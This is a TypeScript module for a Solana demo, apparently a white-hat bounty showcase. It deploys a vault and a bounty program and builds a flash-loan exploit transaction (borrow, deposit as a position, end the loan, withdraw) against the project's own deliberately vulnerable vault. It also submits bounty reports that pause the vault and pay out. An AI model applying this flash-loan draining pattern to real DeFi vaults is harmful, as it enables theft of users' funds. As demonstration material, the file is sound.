import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import {
  Connection,
  Keypair,
  PublicKey,
  SYSVAR_INSTRUCTIONS_PUBKEY,
  SystemProgram,
  Transaction,
  TransactionInstruction,
  sendAndConfirmTransaction,
} from '@solana/web3.js'
import { config } from './config.ts'

export const connection = new Connection(config.rpcUrl, 'confirmed')

const loadKey = (name: string) =>
  Keypair.fromSecretKey(Uint8Array.from(JSON.parse(readFileSync(join(config.keysDir, `${name}.json`), 'utf8'))))

export const keys = {
  payer: loadKey('payer'),
  forwarder: loadKey('forwarder'),
  attacker: loadKey('attacker'),
  payout: loadKey('payout'),
  vaultProgram: loadKey('vault-program').publicKey,
  bountyProgram: loadKey('bounty-program').publicKey,
}

export const [vault] = PublicKey.findProgramAddressSync([Buffer.from('vault')], keys.vaultProgram)
export const [bounty] = PublicKey.findProgramAddressSync([Buffer.from('bounty')], keys.bountyProgram)

const VAULT_SPACE = 75

const u64 = (value: bigint) => {
  const bytes = Buffer.alloc(8)
  bytes.writeBigUInt64LE(value)
  return bytes
}

const positionOf = (user: PublicKey) =>
  PublicKey.findProgramAddressSync([Buffer.from('pos'), user.toBuffer()], keys.vaultProgram)[0]

const depositIx = (user: PublicKey, amount: bigint) =>
  new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: positionOf(user), isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([1]), u64(amount)]),
  })

const withdrawIx = (user: PublicKey) =>
  new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: user, isSigner: true, isWritable: true },
      { pubkey: positionOf(user), isSigner: false, isWritable: true },
    ],
    data: Buffer.from([3]),
  })

const flashBorrowIx = (borrower: PublicKey, amount: bigint) =>
  new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: borrower, isSigner: true, isWritable: true },
      { pubkey: SYSVAR_INSTRUCTIONS_PUBKEY, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([4]), u64(amount)]),
  })

const flashEndIx = () =>
  new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [{ pubkey: vault, isSigner: false, isWritable: true }],
    data: Buffer.from([5]),
  })

const unpauseIx = () =>
  new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: keys.payer.publicKey, isSigner: true, isWritable: false },
    ],
    data: Buffer.from([6]),
  })

const registerIx = () =>
  new TransactionInstruction({
    programId: keys.bountyProgram,
    keys: [
      { pubkey: keys.payer.publicKey, isSigner: true, isWritable: true },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: false },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([1]), u64(config.thresholdLamports), u64(config.bountyLamports)]),
  })

const send = (tx: Transaction, signers: Keypair[]) =>
  sendAndConfirmTransaction(connection, tx, signers, { commitment: 'confirmed' })

export async function initChain(): Promise<void> {
  const payer = keys.payer.publicKey
  const initVault = new TransactionInstruction({
    programId: keys.vaultProgram,
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([0]), bounty.toBuffer(), payer.toBuffer()]),
  })
  const initBounty = new TransactionInstruction({
    programId: keys.bountyProgram,
    keys: [
      { pubkey: payer, isSigner: true, isWritable: true },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([0]), keys.forwarder.publicKey.toBuffer(), payer.toBuffer()]),
  })
  if (!(await connection.getAccountInfo(vault))) {
    console.log('init', await send(new Transaction().add(initVault, initBounty), [keys.payer]))
    console.log('deposit', await send(new Transaction().add(depositIx(payer, config.depositLamports)), [keys.payer]))
  }
  const state = await readState()
  if (!state.active) {
    const tx = new Transaction()
    if (state.vaultPaused) tx.add(unpauseIx())
    tx.add(registerIx())
    console.log('register', await send(tx, [keys.payer]))
  }
  for (const key of [keys.attacker.publicKey, keys.forwarder.publicKey]) {
    if ((await connection.getBalance(key)) < 20_000_000) {
      const transfer = SystemProgram.transfer({ fromPubkey: payer, toPubkey: key, lamports: 50_000_000 })
      console.log('fund', key.toBase58(), await send(new Transaction().add(transfer), [keys.payer]))
    }
  }
}

/** 赔付之后重新开张：解除暂停并重新锁定赏金。 */
export async function rearm(): Promise<string | null> {
  const state = await readState()
  if (state.active) return null
  const tx = new Transaction()
  if (state.vaultPaused) tx.add(unpauseIx())
  tx.add(registerIx())
  return send(tx, [keys.payer])
}

export interface ChainState {
  vaultLamports: number
  vaultPaused: boolean
  guardian: string
  bountyLamports: number
  thresholdLamports: number
  amountLamports: number
  active: boolean
  claimed: boolean
  cancelPending: boolean
}

export async function readState(): Promise<ChainState> {
  const [vaultInfo, bountyInfo] = await connection.getMultipleAccountsInfo([vault, bounty], 'confirmed')
  if (!vaultInfo || !bountyInfo) throw new Error('vault or bounty account is missing; run the init command')
  const v = vaultInfo.data
  const b = bountyInfo.data
  return {
    vaultLamports: vaultInfo.lamports,
    vaultPaused: v[0] !== 0,
    guardian: new PublicKey(v.subarray(2, 34)).toBase58(),
    bountyLamports: bountyInfo.lamports,
    thresholdLamports: Number(b.readBigUInt64LE(96)),
    amountLamports: Number(b.readBigUInt64LE(104)),
    active: b[112] === 1,
    claimed: b[113] === 1,
    cancelPending: b.readBigInt64LE(115) !== 0n,
  }
}

async function idleLamports(): Promise<bigint> {
  const balance = BigInt(await connection.getBalance(vault, 'confirmed'))
  const rent = BigInt(await connection.getMinimumBalanceForRentExemption(VAULT_SPACE))
  return balance - rent
}

/**
 * 构造闪电贷交易。未传 signer 时用演示白帽密钥签好；传了 signer（评委钱包）时返回未签名交易，
 * 由钱包签名后再提交，签名永远不在服务端产生。
 */
export async function buildAttackTx(mode: 'exploit' | 'honest', signer?: PublicKey): Promise<string> {
  const borrower = signer ?? keys.attacker.publicKey
  const amount = await idleLamports()
  if (amount <= 0n) throw new Error('vault has no idle lamports')
  const tx = new Transaction({
    feePayer: borrower,
    ...(await connection.getLatestBlockhash('confirmed')),
  })
  if (mode === 'honest') {
    tx.add(
      flashBorrowIx(borrower, amount),
      SystemProgram.transfer({ fromPubkey: borrower, toPubkey: vault, lamports: amount }),
      flashEndIx()
    )
  } else {
    tx.add(flashBorrowIx(borrower, amount), depositIx(borrower, amount), flashEndIx(), withdrawIx(borrower))
  }
  if (signer) return tx.serialize({ requireAllSignatures: false, verifySignatures: false }).toString('base64')
  tx.sign(keys.attacker)
  return tx.serialize().toString('base64')
}

const dripped = new Map<string, number>()
const DRIP_COOLDOWN_MS = 10 * 60 * 1000

/** 评委钱包余额不够付手续费和仓位租金时，从演示钱包补一点。 */
export async function dripIfNeeded(target: PublicKey): Promise<string | null> {
  const balance = BigInt(await connection.getBalance(target, 'confirmed'))
  if (balance >= config.dripLamports / 2n) return null
  const last = dripped.get(target.toBase58()) ?? 0
  if (Date.now() - last < DRIP_COOLDOWN_MS) return null
  dripped.set(target.toBase58(), Date.now())
  const transfer = SystemProgram.transfer({
    fromPubkey: keys.payer.publicKey,
    toPubkey: target,
    lamports: config.dripLamports,
  })
  return send(new Transaction().add(transfer), [keys.payer])
}

/** 以 forwarder 身份提交 96 字节报告，同一笔交易里暂停金库并支付赏金。 */
export async function submitReport(reportHex: string): Promise<string> {
  const report = Buffer.from(reportHex.replace(/^0x/, ''), 'hex')
  if (report.length !== 96) throw new Error(`report is ${report.length} bytes, expected 96`)
  const payout = new PublicKey(report.subarray(32, 64))
  const ix = new TransactionInstruction({
    programId: keys.bountyProgram,
    keys: [
      { pubkey: keys.forwarder.publicKey, isSigner: true, isWritable: false },
      { pubkey: bounty, isSigner: false, isWritable: true },
      { pubkey: vault, isSigner: false, isWritable: true },
      { pubkey: payout, isSigner: false, isWritable: true },
      { pubkey: keys.vaultProgram, isSigner: false, isWritable: false },
    ],
    data: Buffer.concat([Buffer.from([2]), report]),
  })
  return send(new Transaction().add(ix), [keys.forwarder])
}

export async function getSlot(): Promise<number> {
  return connection.getSlot('confirmed')
}

export async function getBalance(address: PublicKey): Promise<number> {
  return connection.getBalance(address, 'confirmed')
}
